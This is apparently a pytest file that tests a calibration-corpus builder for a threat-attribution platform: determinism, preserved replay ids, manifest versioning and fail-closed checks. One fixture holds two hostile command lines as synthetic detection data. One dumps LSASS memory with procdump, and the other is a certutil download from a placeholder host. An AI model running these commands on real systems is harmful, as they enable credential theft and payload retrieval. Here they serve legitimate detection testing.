"""Tests for the C3.2 golden-corpus builder — first implementation slice
(ADR-0006 §D5/§D6/§D13; B1-M/B1-D).

Proves the builder assembles valid ``CalibrationCase`` objects from what the
real, unmodified replay pipeline produces, builds a manifest whose
``calibration_corpus_version`` comes from the existing identity mechanism, is
deterministic and PYTHONHASHSEED-independent, never mutates its inputs, and
preserves (never fabricates) replay-produced ids. Offline, deterministic.

No fitting, no ``calibration_version``, no scoring, no G3.6.
"""

from __future__ import annotations

import subprocess
import sys
from datetime import UTC, datetime
from pathlib import Path

import pytest

from attribution_platform.attack_knowledge.loader import AttackKnowledge, load_attack_knowledge
from attribution_platform.calibration import (
    CalibrationCase,
    CalibrationCorpusManifest,
    describe_corpus_composition,
    require_valid_provenance,
    require_valid_split,
)
from attribution_platform.calibration.contracts import (
    ActorLabelSource,
    CaseRole,
    ExpectedOutcome,
    ExpectedOutputShape,
    GroundTruth,
    LabelConfidence,
    LabelSemantics,
    SourceKind,
)
from attribution_platform.calibration.corpus_builder import (
    CorpusBuildResult,
    CorpusScenarioAnnotation,
    build_calibration_case,
    build_corpus,
    build_corpus_from_dir,
    load_corpus_entries_from_dir,
)
from attribution_platform.calibration.errors import CalibrationError
from attribution_platform.dataplane import FakeElasticClient
from attribution_platform.detection import DetectionEngine, load_rule_pack
from attribution_platform.domain import HostRef, ProcessRef
from attribution_platform.replay import (
    DetectionReplayFixture,
    DetectionReplayScenario,
    replay_fixture_through_behavioral_sequences,
)
from attribution_platform.sources.synthetic import SyntheticRecord

REPO_ROOT = Path(__file__).resolve().parents[1]
RULE_PACK_PATH = REPO_ROOT / "fixtures" / "phase1_core_rules.json"
SEED_ROOT = REPO_ROOT / "data" / "calibration" / "corpus" / "seed"
T0 = datetime(2026, 7, 1, 9, 0, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def knowledge() -> AttackKnowledge:
    return load_attack_knowledge()


@pytest.fixture()
def engine(knowledge: AttackKnowledge) -> DetectionEngine:
    return DetectionEngine(rules=load_rule_pack(RULE_PACK_PATH, knowledge=knowledge).rules)


def _build(knowledge: AttackKnowledge, engine: DetectionEngine) -> CorpusBuildResult:
    return build_corpus_from_dir(
        SEED_ROOT, client_factory=FakeElasticClient, engine=engine, knowledge=knowledge
    )


# ===========================================================================
# 1. Valid cases from the seed corpus
# ===========================================================================


def test_builder_creates_valid_calibration_cases(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    result = _build(knowledge, engine)
    assert len(result.cases) == 3
    for case in result.cases:
        assert isinstance(case, CalibrationCase)
        assert case.attack_kb_version == knowledge.attack_kb_version
        assert case.correlation_group_id and case.sequence_id
        assert case.telemetry_provenance  # non-empty
    roles = {c.case_role for c in result.cases}
    assert roles == {CaseRole.CALIBRATION, CaseRole.HELD_OUT_VALIDATION}


def test_seed_covers_positive_and_abstention_shapes(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    result = _build(knowledge, engine)
    outcomes = {c.expected_output_shape.outcome for c in result.cases}
    assert ExpectedOutcome.LEADING_HYPOTHESIS in outcomes
    assert ExpectedOutcome.INSUFFICIENT_EVIDENCE in outcomes
    semantics = {c.ground_truth.label_semantics for c in result.cases}
    assert LabelSemantics.ATTRIBUTABLE in semantics
    assert LabelSemantics.UNKNOWN in semantics


# ===========================================================================
# 2. Replay-produced ids are preserved, not fabricated
# ===========================================================================


def test_replay_ids_are_preserved_not_fabricated(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    entries = load_corpus_entries_from_dir(SEED_ROOT)
    annotation, fixture = next(e for e in entries if "alpha" in e[1].fixture_id)

    # independent direct replay
    direct = replay_fixture_through_behavioral_sequences(
        fixture, client=FakeElasticClient(), engine=engine, knowledge=knowledge
    )
    assert len(direct.sequences) == 1
    direct_sequence = direct.sequences[0]
    direct_group = next(
        g
        for g in direct.correlation_result.contextual_result.groups
        if g.group_id == direct_sequence.group_id
    )

    case = build_calibration_case(
        annotation, fixture, client=FakeElasticClient(), engine=engine, knowledge=knowledge
    )
    assert case.correlation_group_id == direct_group.group_id
    assert case.sequence_id == direct_sequence.sequence_id
    expected_provenance = tuple(
        sorted(set(direct_group.member_observation_ids) | set(direct_group.member_evidence_ids))
    )
    assert case.telemetry_provenance == expected_provenance


# ===========================================================================
# 3-4. Manifest construction + calibration_corpus_version via existing mechanism
# ===========================================================================


def test_manifest_and_version_use_existing_mechanism(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    result = _build(knowledge, engine)
    assert isinstance(result.manifest, CalibrationCorpusManifest)
    assert result.calibration_corpus_version == result.manifest.calibration_corpus_version
    # No second hashing: recomputing via the existing from_cases mechanism over
    # the same cases + source entries yields the identical version.
    recomputed = CalibrationCorpusManifest.from_cases(
        result.cases,
        result.manifest.source_entries,
        attack_kb_version=knowledge.attack_kb_version,
    )
    assert recomputed.calibration_corpus_version == result.calibration_corpus_version


# ===========================================================================
# 5, 8. Deterministic repeated builds
# ===========================================================================


def test_repeated_builds_are_identical(knowledge: AttackKnowledge, engine: DetectionEngine) -> None:
    a = _build(knowledge, engine)
    b = _build(knowledge, engine)
    assert a.calibration_corpus_version == b.calibration_corpus_version
    assert [c.case_id for c in a.cases] == [c.case_id for c in b.cases]
    assert a.cases == b.cases


# ===========================================================================
# 6. PYTHONHASHSEED independence (subprocess)
# ===========================================================================

_SUBPROCESS = """
from pathlib import Path
from attribution_platform.attack_knowledge.loader import load_attack_knowledge
from attribution_platform.dataplane import FakeElasticClient
from attribution_platform.detection import DetectionEngine, load_rule_pack
from attribution_platform.calibration.corpus_builder import build_corpus_from_dir
kb = load_attack_knowledge()
pack = load_rule_pack(Path("fixtures/phase1_core_rules.json"), knowledge=kb)
eng = DetectionEngine(rules=pack.rules)
res = build_corpus_from_dir(
    Path("data/calibration/corpus/seed"), client_factory=FakeElasticClient, engine=eng, knowledge=kb
)
print(res.calibration_corpus_version + "|" + ",".join(c.case_id for c in res.cases))
"""


def _run_under_seed(seed: str) -> str:
    return subprocess.run(
        [sys.executable, "-c", _SUBPROCESS],
        capture_output=True,
        text=True,
        cwd=REPO_ROOT,
        env={"PYTHONHASHSEED": seed, "PYTHONPATH": "src"},
        check=True,
    ).stdout.strip()


def test_corpus_version_pythonhashseed_independent() -> None:
    first = _run_under_seed("0")
    assert first
    assert first == _run_under_seed("1") == _run_under_seed("424242")


# ===========================================================================
# 7. Inputs not mutated
# ===========================================================================


def test_build_does_not_mutate_knowledge_or_fixtures(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    fingerprint = knowledge.object_fingerprint
    entries = load_corpus_entries_from_dir(SEED_ROOT)
    fixtures_before = tuple(fixture for _annotation, fixture in entries)

    build_corpus(entries, client_factory=FakeElasticClient, engine=engine, knowledge=knowledge)

    assert knowledge.object_fingerprint is fingerprint
    # frozen fixtures are value-equal to a fresh reload
    reloaded = tuple(fixture for _annotation, fixture in load_corpus_entries_from_dir(SEED_ROOT))
    assert fixtures_before == reloaded


# ===========================================================================
# 9. Provenance / split validation behaves as expected + fail-closed cases
# ===========================================================================


def test_seed_corpus_passes_split_and_provenance_validation(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    result = _build(knowledge, engine)
    require_valid_split(result.cases, result.manifest)  # no raise
    require_valid_provenance(result.manifest)  # no raise
    composition = describe_corpus_composition(result.manifest, result.cases)
    assert composition is not None


def _annotation() -> CorpusScenarioAnnotation:
    return CorpusScenarioAnnotation(
        scenario_family_id="probe-family",
        case_role=CaseRole.CALIBRATION,
        source_kind=SourceKind.SYNTHETIC,
        source_ref="probe@0.1",
        license="MIT",
        acquisition_provenance="probe hand-authored synthetic scenario for a builder unit test",
        transformation_provenance="replayed through the pinned pipeline unmodified",
        ground_truth=GroundTruth(
            actor_label_source=ActorLabelSource.DATASET_ANNOTATION,
            label_semantics=LabelSemantics.ATTRIBUTABLE,
            label_confidence=LabelConfidence.MODERATE,
            actor_label="EMU-PROBE",
        ),
        expected_output_shape=ExpectedOutputShape(
            outcome=ExpectedOutcome.LEADING_HYPOTHESIS,
            authorship_provenance="probe authored intent, not ATT&CK-derived",
            expected_likelihood_band="AUTHORED-LEADING",
        ),
    )


def _two_group_fixture() -> DetectionReplayFixture:
    # Two independent single-step detections on two unrelated hosts -> two groups.
    scenarios = (
        DetectionReplayScenario(
            scenario_id="p1",
            raw_record=SyntheticRecord(record_id="r-p1", timestamp=T0, observation_id="obs-p1"),
            process=ProcessRef(
                name="procdump.exe",
                command_line="procdump.exe -ma lsass.exe C:\\t\\l.dmp",
                entity_id="p1",
            ),
            host=HostRef(id="host-p1"),
        ),
        DetectionReplayScenario(
            scenario_id="p2",
            raw_record=SyntheticRecord(
                record_id="r-p2", timestamp=T0.replace(second=1), observation_id="obs-p2"
            ),
            process=ProcessRef(
                name="certutil.exe",
                command_line="certutil.exe -urlcache -split -f http://x.invalid/p p",
                entity_id="p2",
            ),
            host=HostRef(id="host-p2"),
        ),
    )
    return DetectionReplayFixture(
        fixture_id="probe-two-groups", content_hash="0" * 64, scenarios=scenarios
    )


def test_fixture_with_multiple_groups_fails_closed(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    with pytest.raises(CalibrationError, match="exactly one"):
        build_calibration_case(
            _annotation(),
            _two_group_fixture(),
            client=FakeElasticClient(),
            engine=engine,
            knowledge=knowledge,
        )


def test_disagreeing_source_provenance_fails_closed(
    knowledge: AttackKnowledge, engine: DetectionEngine
) -> None:
    entries = load_corpus_entries_from_dir(SEED_ROOT)
    alpha = next(e for e in entries if "alpha" in e[1].fixture_id)
    bravo = next(e for e in entries if "bravo" in e[1].fixture_id)
    # same source_ref, deliberately mutated provenance on one -> fail closed
    from dataclasses import replace

    conflicting = (
        replace(bravo[0], acquisition_provenance="a different provenance string"),
        bravo[1],
    )
    with pytest.raises(CalibrationError, match="disagreeing"):
        build_corpus(
            [alpha, conflicting],
            client_factory=FakeElasticClient,
            engine=engine,
            knowledge=knowledge,
        )
